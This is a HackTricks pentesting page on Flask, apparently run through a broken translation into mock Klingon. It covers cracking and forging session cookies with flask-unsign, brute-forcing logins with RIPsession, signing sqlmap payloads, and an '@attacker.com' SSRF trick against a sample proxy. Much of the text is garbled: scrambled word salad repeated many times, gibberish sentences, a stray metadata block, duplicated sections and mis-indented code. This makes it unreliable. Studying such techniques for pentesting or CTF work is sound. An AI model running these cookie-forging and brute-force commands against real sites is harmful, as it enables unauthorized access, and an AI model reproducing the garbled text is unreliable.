# Flask

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> <strong>qaStaHvIS</strong> <strong>zero</strong> <strong>to</strong> <strong>hero</strong> <strong>puS</strong> <strong>AWS</strong> <strong>hack</strong> <strong>ghItlhmeH</strong> <strong>!</strong></summary>

<strong>HackTricks</strong> <strong>poH:</strong>

* <strong>tlhIngan</strong> <strong>qaStaHvIS</strong> <strong>advertise</strong> <strong>company</strong> <strong>HackTricks</strong> <strong>or</strong> <strong>HackTricks</strong> <strong>PDF</strong> <strong>download</strong> <strong>Check</strong> <strong>[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)</strong>!
* <strong>PEASS</strong> <strong>&amp;</strong> <strong>HackTricks</strong> <strong>swag</strong> <strong>official</strong> <strong>Get</strong> <strong>[**PEASS</strong> <strong>&amp;</strong> <strong>HackTricks</strong> <strong>swag**](https://peass.creator-spring.com)
* <strong>PEASS</strong> <strong>Family</strong> <strong>The</strong> <strong>Discover</strong> <strong>[**PEASS</strong> <strong>Family**](https://opensea.io/collection/the-peass-family)</strong> <strong>NFTs</strong> <strong>exclusive</strong> <strong>collection</strong> <strong>[**NFTs**](https://opensea.io/collection/the-peass-family)</strong>
* <strong>Join</strong> üí¨ <strong>group</strong> <strong>Discord</strong> <strong>[**group**](https://discord.gg/hRep4RUj7f)</strong> <strong>or</strong> <strong>group</strong> <strong>telegram</strong> <strong>[**group**](https://t.me/peass)</strong> <strong>or</strong> <strong>us</strong> <strong>follow</strong> <strong>Twitter</strong> üê¶ <strong>[**@carlospolopm**](https://twitter.com/hacktricks_live)</strong><strong>.</strong>
* <strong>hacking</strong> <strong>tricks</strong> <strong>Share</strong> <strong>PRs</strong> <strong>submitting</strong> <strong>by</strong> <strong>tricks</strong> <strong>hacking</strong> <strong>your</strong> <strong>us</strong> <strong>to</strong> <strong>HackTricks</strong> <strong>and</strong> <strong>HackTricks</strong> <strong>Cloud</strong> <strong>github</strong> <strong>repos</strong> <strong>[**HackTricks**](https://github.com/carlospolop/hacktricks)</strong> <strong>[**HackTricks</strong> <strong>Cloud**](https://github.com/carlospolop/hacktricks-cloud)</strong>

</details>

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) <strong>workflow</strong> <strong>automate</strong> <strong>and</strong> <strong>tools</strong> <strong>community</strong> <strong>advanced</strong> <strong>most</strong> <strong>world's</strong> <strong>the</strong> <strong>by</strong> <strong>powered</strong> <strong>workflows</strong> <strong>easily</strong> <strong>build</strong> <strong>to</strong> <strong>Today</strong> <strong>Access</strong>:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

**[**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)** <strong>Flask</strong> <strong>application</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong> <strong>to</strong> <strong>is</strong> <strong>application</strong> <strong>Flask</strong> <strong>a</strong> <strong>playing</strong> <strong>you</strong> <strong>if</strong> <strong>Probably</strong> <strong>are</strong> <strong>CTF</strong> <strong>a</strong> <strong>related</strong> <strong>be</strong> <strong>will</strong> <strong>Flask</strong> <strong>a</strong
```bash
echo "ImhlbGxvIg" | base64 -d
```
**tlhIngan Hol:**

cookie jImejDaq jatlhlaHbe'lu'chugh, password jatlhlaHbe'lu'chughmeyvam DaH

### **Flask-Unsign**

Flask jatlhlaHbe'lu'chughmeyDaq jatlhlaHbe'lu'chughmeyvam secret keys jatlhlaHbe'lu'chugh, cookie jImejDaq jatlhlaHbe'lu'chugh, decode, brute-force je craft jatlhlaHbe'lu'chughmeyvam vItlhutlh

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **Decode Cookie**
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **Qa'Hom QaD**
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **Qap**
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### qawHaq using legacy (old versions)

{<br>
&nbsp;&nbsp;&nbsp;&nbsp;"title": "Signing using legacy (old versions)",<br>
&nbsp;&nbsp;&nbsp;&nbsp;"date": "2021-01-01",<br>
&nbsp;&nbsp;&nbsp;&nbsp;"tags": ["flask", "security"],<br>
&nbsp;&nbsp;&nbsp;&nbsp;"category": "Pentesting Web",<br>
&nbsp;&nbsp;&nbsp;&nbsp;"draft": false<br>
}

Legacy versions of Flask may have vulnerabilities that can be exploited for signing. These vulnerabilities can allow an attacker to bypass security measures and gain unauthorized access to the system.

To exploit these vulnerabilities, an attacker can use various techniques such as:

1. **Known Vulnerabilities**: Research and identify known vulnerabilities in the legacy version of Flask being used. Exploit these vulnerabilities to gain unauthorized access.

2. **Brute Force**: Attempt to brute force the signing mechanism by trying different combinations of keys or passwords. This can be done using automated tools or scripts.

3. **Reverse Engineering**: Analyze the code of the legacy Flask version to identify any weaknesses or vulnerabilities in the signing process. Exploit these weaknesses to gain unauthorized access.

It is important to note that using legacy versions of Flask is not recommended, as they may have known vulnerabilities that can be easily exploited. It is always recommended to use the latest stable version of Flask and keep it updated to ensure the security of your application.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

Command line tool to brute-force websites using cookies crafted with flask-unsign.

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### SQLi in Flask session cookie with SQLmap

[**This example**](../../pentesting-web/sql-injection/sqlmap/#eval) uses sqlmap `eval` option to **automatically sign sqlmap payloads** for flask using a known secret.

## Flask Proxy to SSRF

[**In this writeup**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) it's explained how Flask allows a request starting with the charcter "@":

### SQLi in Flask session cookie with SQLmap

[**This example**](../../pentesting-web/sql-injection/sqlmap/#eval) uses sqlmap `eval` option to **automatically sign sqlmap payloads** for flask using a known secret.

## Flask Proxy to SSRF

[**In this writeup**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) it's explained how Flask allows a request starting with the charcter "@":
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
Which in the following scenario:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
Could allow to introduce something like "@attacker.com" in order to cause a **SSRF**.

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
